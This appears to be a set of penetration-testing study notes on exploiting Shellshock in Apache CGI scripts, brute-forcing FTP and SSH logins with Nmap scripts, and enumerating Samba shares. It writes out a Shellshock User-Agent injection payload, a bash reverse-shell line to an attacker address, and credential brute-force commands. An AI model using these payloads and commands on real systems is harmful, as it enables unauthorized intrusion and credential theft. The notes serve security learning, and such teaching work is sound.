
---

##   Exploiting Bash CVE-2014-6271 Vulnerability (Shellshock)


Shellshock is the name give to a family of vulnerabilities in the Bash shell (since V1.3) that allow an attacker to execute remote arbitrary commands via Bash, consequently allowing the attacker to obtain remote access to the target system via a reverse shell.

The Shellshock vulnerability is caused by a vulnerability in Bash, whereby Bash mistakenly executes trailing commands after a series of characters:(){:;};

This vulnerability only affects Linux as Windows doesn't use Bash as it is not a Nix based operating system. 

In the context of remote exploitation, Apache web servers configured to run CGI scripts or .sh scripts are also vulnerable to this attack.

CGI (Common Gateway Interface) scripts are used by Apache to execute arbitrary commands on the Linux systems, after which the output is displayed to the client.

In order to exploit this vulnerability, we will need to locate an input vector or script that allows us to communicate with Bash.

In the context of an Apache web server, we can utilize any legitimate CGI scripts accessible on the web server.

Whenever a CGI script is executed, the web server will initiate a new process and a run the CGI script with Bash.

This vulnerability can be exploited both manually and automatically with the use of an MSF exploit module.

If we are having a website that is running Apache, we can see if there is a CGI script being used by right clicking on the web page and choose "view page source"

If we see any script section:<script> file.cgi</script> that means this website is probably vulnerable to a Shellshock attack.

**To make sure the website is vulnerable to Shellshock attack, we will use Nmap:**
`nmap -Pn --script=http-shellshock.nse --script-args "http-shellshock.uri=/(filename).cgi" -A -p80 -v (target webbsite)`

We will utilize BurpSuite for this vulnerability.

We will intercept the traffic with BurpSuite while are in the .cgi file page. For example, if the website is using a file called gettime.cgi in its code, we will go to this page: (target website)/gettime.cgi

After capturing the traffic, we will be attacking the User-Agent part in the HTTP header.

We send the request that we captured to Repeater.

To execute the malicious code:User-Agent: () { : ; };  echo; echo; /bin/bash -c '(our malicious code)' 

We can have a reverse shell session by using netcat on a port and replace the malicious code with this instead:bash -i >&/dev/tcp/(our IP address)/(port number) 0>&1.

**We can also use MSF to both, check if the target is vulnerable and to get a reverse shell session on target by using these modules: "auxiliary/scanner/http/apache_mod_cgi_bash_env", and "exploit/multi/http/apache_mod_cgi_bash_env_exec"**


---

## Exploiting FTP

We know already about the MSF module that would brute-force ftp servers to give us valid credentials. However, there is a much faster script in Nmap that does the same thing:`nmap -Pn --script=ftp-brute.nse --script-args userdb=(list of users),passdb=(list of passwords) -v -p21 (target IP)`

---

## Exploiting SSH

As we have done for FTP, we can use this command in Nmap that would brute-force ssh for us: `nmap -Pn --script=ssh-brute.nse --script-args userdb=(list of usernames),passdb=(list of passwords) -p22 -v (target)| grep "Valid credentials"`

---


## Exploiting Samba

After obtaining valid credentials, we can use SMBMap in order to enumerate SAMBA share drives, list contents of the shares as well as download files and execute remote commands on the target.

We can use SMBMap like so:`smbmap -H (target IP) -u (username) -p (password)`

We can use the tool enum4linux to run a basic enumeration against smb server like so: `enum4linux -a (target IP)` , and when we manage to get valid credentials, we can run another enumeration scan that is more comprehensive: `enum4linux -a -u (username) -p (password) (target IP)`

---

